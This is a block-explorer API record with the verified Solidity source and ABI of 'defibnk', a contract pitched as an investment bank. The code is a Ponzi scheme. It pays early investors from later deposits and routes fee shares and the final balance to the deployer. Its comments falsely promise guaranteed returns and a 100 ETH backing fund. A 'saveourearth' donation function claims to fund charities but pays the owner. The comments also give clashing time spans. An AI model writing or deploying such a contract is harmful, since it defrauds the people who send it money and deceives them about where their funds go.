{"status":"1","message":"OK","result":[{"SourceCode":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity^0.8.5;\r\n\r\n\r\ncontract defibnk {\r\n\r\n    // Global Variables\r\n    uint32 public lastPayout;\r\n    uint public lastInvestment;\r\n    uint public profitFromCrash;\r\n    address []  investors;\r\n        struct eliteinvestor {\r\n    \t\taddress payable addr;\r\n    \t\tuint amount;\r\n    \t}\r\n\teliteinvestor [] eliteinvestors;\r\n    uint[] public investmentsMade;\r\n    address payable private bnkfee;\r\n    //address payable public lastcreditor;\r\n    mapping (address => uint) affiliates;\r\n    uint constant THREE_DAYS = 172800;\r\n    uint8 public round;\r\n    uint public totaleliteinvestors = 0;\r\n    uint public percent = 4;\r\n    //Every elite investor gets 4% return on his investment when a new member joins. Elite members become lifelong members and keep receiving interest.\r\n\r\n    constructor () payable {\r\n        // the defibnk is launched. Send 0.05 to 0.15 ETH and get guarenteed 10% return on your investment. Invest 0.15 to 0.5 ETH and get 50% return on your investment. Invest 0.5 to 5 ETH and become an Elite investor.\r\n        profitFromCrash = 100 * 10**18;\r\n        // The defibank is backed by a 100ETH balance. If no new investments are made within 36 hours, this fund will be sent to the last investor as a jackpot.\r\n        bnkfee = payable(msg.sender);\r\n        //a percentage of each investment is used to investment into other cryptocurrencies.  \r\n        lastInvestment = block.timestamp;\r\n        \r\n    }\r\n\r\n    function becomeInvestor(address affiliate) public payable returns (bool) {\r\n        uint amount = msg.value;\r\n        // check if the system already broke down. If for 36hrs no new investor joins then the system will break down.\r\n        // 36h are on average = 172800\r\n        if (lastInvestment + THREE_DAYS < block.timestamp) {\r\n            //Return money to sender\r\n            //lastcreditor = payable(msg.sender);\r\n            payable(msg.sender).transfer(amount);\r\n            // Sends all contract money to the last creditor\r\n            payable (investors[investors.length - 1]).transfer(profitFromCrash);\r\n            bnkfee.transfer(address(this).balance);\r\n            // Reset contract state\r\n            lastPayout = 0;\r\n            lastInvestment = block.timestamp;\r\n            profitFromCrash = 0;\r\n            investors = new address payable [](0);\r\n            investmentsMade = new uint[](0);\r\n            round += 1;\r\n            return false;\r\n        }\r\n        else {\r\n            // investments from the silver members is 0.05 ETH to 0.25 ETH \r\n            if (amount >= 5* 10**16 && amount <= 15 * 10**16 ) {\r\n                lastInvestment = block.timestamp;\r\n                // register investment and his amount with 10% interest rate. Basic members get 10% investment return. \r\n                investors.push(msg.sender);\r\n                investmentsMade.push(amount * 110 / 100);\r\n                // The investment amount and reward have been noted down\r\n                bnkfee.transfer(amount * 20/100);\r\n                // building the jackpot (they will increase the value for the person seeing the crash coming)\r\n                if (profitFromCrash < 1000 * 10**18) {\r\n                    profitFromCrash += amount * 5/100;\r\n                }\r\n                // affiliates get 5% of the invested amount\r\n                if(affiliates[affiliate] >= amount) {\r\n                    payable(affiliate).transfer(amount * 5/100);\r\n                }\r\n                affiliates[msg.sender] += amount * 110 / 100;\r\n                // the money will be used to invest in cryptocurrency funds and then the profit is distributed to our partners.\r\n                if (investmentsMade[lastPayout] <= address(this).balance) {\r\n                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);\r\n                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];\r\n                    lastPayout += 1;\r\n                }\r\n                return true;\r\n            }\r\n            \r\n            else if (amount >= 15 * 10**16 && amount <= 5 * 10**17 ) {\r\n                // the System has received fresh money, it will survive at leat 36h more\r\n                lastInvestment = block.timestamp;\r\n                // register investment and his amount with 50% interest rate. Platinum members get 50% investment return. \r\n                investors.push(msg.sender);\r\n                investmentsMade.push(amount * 150 / 100);\r\n                bnkfee.transfer(amount * 15/100);\r\n                if (profitFromCrash < 1000 * 10**18) {\r\n                    profitFromCrash += amount * 5/100;\r\n                }\r\n                if(affiliates[affiliate] >= amount) {\r\n                    payable(affiliate).transfer(amount * 5/100);\r\n                }\r\n                affiliates[msg.sender] += amount * 110 / 100;\r\n               if (investmentsMade[lastPayout] <= address(this).balance) {\r\n                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);\r\n                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];\r\n                    lastPayout += 1;\r\n                }\r\n                return true;\r\n            }\r\n            else if (amount >= 5 * 10**17 && amount <= 5 * 10**18 ) {\r\n                lastInvestment = block.timestamp;\r\n                // register investment and his amount. Elite members get 1% return on each new elite member who joins.. \r\n                eliteinvestors.push(eliteinvestor(payable(msg.sender), msg.value));\r\n                totaleliteinvestors += 1;\r\n                bnkfee.transfer(amount * 15/100);\r\n                if (profitFromCrash < 1000 * 10**18) {\r\n                    profitFromCrash += amount * 5/100;\r\n                }\r\n                if(affiliates[affiliate] >= amount) {\r\n                    payable(affiliate).transfer(amount * 5/100);\r\n                }\r\n                affiliates[msg.sender] += amount * 110 / 100;\r\n                uint position = 0;\r\n                \r\n                while(position < totaleliteinvestors) {\r\n                    uint payout = (eliteinvestors[position].amount)*percent/100;\r\n                    if(payout > address(this).balance){\r\n                        break;\r\n                    }\r\n                    eliteinvestors[position].addr.transfer(payout);\r\n                    position += 1;\r\n                }\r\n                \r\n                if (investmentsMade[lastPayout] <= address(this).balance) {\r\n                    payable(investors[lastPayout]).transfer(investmentsMade[lastPayout]);\r\n                    affiliates[investors[lastPayout]] -= investmentsMade[lastPayout];\r\n                    lastPayout += 1;\r\n                }\r\n                return true;\r\n            }\r\n            else {\r\n                payable(msg.sender).transfer(amount);\r\n                return false;\r\n            }\r\n        }\r\n    }\r\n\r\n    // fallback function\r\n    receive() external payable {\r\n        becomeInvestor(address(0));\r\n    }\r\n\r\n    function totalDebt() private view returns (uint debt) {\r\n        for(uint i=lastPayout; i<investmentsMade.length; i++){\r\n            debt += investmentsMade[i];\r\n        }\r\n    }\r\n\r\n    function totalPayedOut() public view returns (uint payout) {\r\n        for(uint i=0; i<lastPayout; i++){\r\n            payout += investmentsMade[i];\r\n        }\r\n    }\r\n\r\n    // All money goes to charities and NGOs accross the world fighting to keep the earth free from global warming and pollution.\r\n    function saveourearth() public payable {\r\n        bnkfee.transfer(msg.value);\r\n    }\r\n\r\n    // Index fund investments run using the money invested into the bank.\r\n    function inheritToNextGeneration(address nextGeneration) public {\r\n        if (msg.sender == bnkfee) {\r\n            bnkfee = payable (nextGeneration);\r\n        }\r\n    }\r\n\r\n    function showinvestors() public view returns (address[] memory) {\r\n        return investors;\r\n    }\r\n    \r\n    function showEliteinvestors() public view returns (eliteinvestor[] memory) {\r\n        return eliteinvestors;\r\n    }\r\n\r\n    function getinvestmentsMade() public view returns ( uint[] memory) {\r\n        return investmentsMade;\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"affiliate\",\"type\":\"address\"}],\"name\":\"becomeInvestor\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getinvestmentsMade\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nextGeneration\",\"type\":\"address\"}],\"name\":\"inheritToNextGeneration\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"investmentsMade\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastInvestment\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastPayout\",\"outputs\":[{\"internalType\":\"uint32\",\"name\":\"\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"percent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"profitFromCrash\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"round\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"saveourearth\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"showEliteinvestors\",\"outputs\":[{\"components\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"internalType\":\"struct defibnk.eliteinvestor[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"showinvestors\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"\",\"type\":\"address[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalPayedOut\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"payout\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totaleliteinvestors\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"defibnk","CompilerVersion":"v0.8.5+commit.a4f2e591","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://c84e82eff5f08e36e4f2698aaebe95d88d1bbc130a5610d93e3df7cc5fa2d7a7"}]}